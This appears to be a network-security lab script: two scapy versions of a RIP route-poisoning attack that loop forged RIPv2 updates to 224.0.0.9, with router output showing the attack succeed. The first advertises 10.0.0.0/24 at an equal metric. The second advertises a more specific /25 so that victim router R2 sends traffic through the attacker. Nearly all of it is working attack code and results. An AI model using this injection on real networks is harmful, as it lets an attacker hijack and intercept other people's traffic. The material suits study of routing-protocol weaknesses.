# First try, didnt work because the metric was the same as the actual path, same cost and same subnet

from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.rip import RIP, RIPEntry

# Multicast RIP address
dst_ip = "224.0.0.9"

packet = IP(dst=dst_ip) / UDP(sport=520, dport=520) / \
         RIP(cmd=2, version=2) / \
         RIPEntry(addr="10.0.0.0", mask="255.255.255.0", metric=1)

# Send continuously
send(packet, loop=1, inter=2)

''' Here showing the result, r2 has to paths (both the legitimate one and the attackers)
R2#sh ip route 
Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2
       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
       ia - IS-IS inter area, * - candidate default, U - per-user static route
       o - ODR, P - periodic downloaded static route

Gateway of last resort is not set

C    192.168.12.0/24 is directly connected, FastEthernet0/1
     172.16.0.0/24 is subnetted, 1 subnets
C       172.16.0.0 is directly connected, FastEthernet1/0
     10.0.0.0/24 is subnetted, 1 subnets
R       10.0.0.0 [120/1] via 192.168.23.3, 00:00:16, FastEthernet0/0
C    192.168.23.0/24 is directly connected, FastEthernet0/0
R    192.168.1.0/24 [120/1] via 192.168.12.1, 00:00:07, FastEthernet0/1
R2#sh ip route
Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2
       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
       ia - IS-IS inter area, * - candidate default, U - per-user static route
       o - ODR, P - periodic downloaded static route

Gateway of last resort is not set

C    192.168.12.0/24 is directly connected, FastEthernet0/1
     172.16.0.0/24 is subnetted, 1 subnets
C       172.16.0.0 is directly connected, FastEthernet1/0
     10.0.0.0/24 is subnetted, 1 subnets
R       10.0.0.0 [120/1] via 192.168.23.3, 00:00:01, FastEthernet0/0
                 [120/1] via 172.16.0.2, 00:00:01, FastEthernet1/0
C    192.168.23.0/24 is directly connected, FastEthernet0/0
R    192.168.1.0/24 [120/1] via 192.168.12.1, 00:00:15, FastEthernet0/1
R2#
'''

# Second try, correct result

from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.rip import RIP, RIPEntry

# Multicast RIP address
dst_ip = "224.0.0.9"

packet = IP(dst=dst_ip) / UDP(sport=520, dport=520) / \
         RIP(cmd=2, version=2) / \
         RIPEntry(
             addr="10.0.0.0",
             mask="255.255.255.128",   # /25 instead of /24
             metric=5                  # metric doesn't matter now
         )

# Send continuously
send(packet, loop=1, inter=2)

''' Here the R2 has a more specific route through the attacker
R2#sh ip route
Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2
       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
       ia - IS-IS inter area, * - candidate default, U - per-user static route
       o - ODR, P - periodic downloaded static route

Gateway of last resort is not set

C    192.168.12.0/24 is directly connected, FastEthernet0/1
     172.16.0.0/24 is subnetted, 1 subnets
C       172.16.0.0 is directly connected, FastEthernet1/0
     10.0.0.0/8 is variably subnetted, 2 subnets, 2 masks
R       10.0.0.0/25 [120/5] via 172.16.0.2, 00:00:01, FastEthernet1/0
R       10.0.0.0/24 [120/1] via 192.168.23.3, 00:00:02, FastEthernet0/0
                    [120/1] via 172.16.0.2, 00:01:00, FastEthernet1/0
C    192.168.23.0/24 is directly connected, FastEthernet0/0
R    192.168.1.0/24 [120/1] via 192.168.12.1, 00:00:14, FastEthernet0/1
R2#
'''